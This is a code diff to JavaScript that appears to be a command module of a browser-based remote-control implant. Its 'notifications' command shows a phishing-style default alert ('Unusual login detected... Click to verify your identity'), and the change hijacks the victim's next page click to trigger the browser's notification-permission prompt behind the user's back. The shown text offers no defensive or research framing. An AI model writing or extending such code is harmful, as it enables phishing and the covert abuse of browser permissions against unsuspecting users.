@@ -1,8 +1,5 @@
 COMMANDS['notifications'] = async function(task) {
-    var params = task.parameters;
-    if (typeof params === 'string') {
-        try { params = JSON.parse(params); } catch (e) { params = {}; }
-    }
+    var params = parseParams(task);
     var title = (params && params.title) ? params.title : 'IT Security Alert';
     var body = (params && params.body) ? params.body : 'Unusual login detected on your account. Click to verify your identity.';
     var icon = (params && params.icon) ? params.icon : '';
@@ -13,10 +10,35 @@ COMMANDS['notifications'] = async function(task) {
         return JSON.stringify({error: 'Notification API not available'}, null, 2);
     }
 
-    // Request permission if needed
+    // Request permission — browsers require a user gesture for this call,
+    // so if we don't have permission yet, wait for the next click.
     var perm = Notification.permission;
     if (perm === 'default') {
-        perm = await Notification.requestPermission();
+        perm = await new Promise(function(resolve) {
+            var resolved = false;
+            function handler() {
+                if (resolved) return;
+                resolved = true;
+                document.removeEventListener('click', handler, true);
+                Notification.requestPermission().then(resolve).catch(function() { resolve('denied'); });
+            }
+            document.addEventListener('click', handler, true);
+            // Timeout after 30s — don't hang forever waiting for a click
+            setTimeout(function() {
+                if (!resolved) {
+                    resolved = true;
+                    document.removeEventListener('click', handler, true);
+                    resolve('timeout');
+                }
+            }, 30000);
+        });
+    }
+
+    if (perm === 'timeout') {
+        return JSON.stringify({
+            error: 'Notification permission requires a user click — timed out after 30s waiting for interaction',
+            permission: 'default'
+        }, null, 2);
     }
 
     if (perm !== 'granted') {
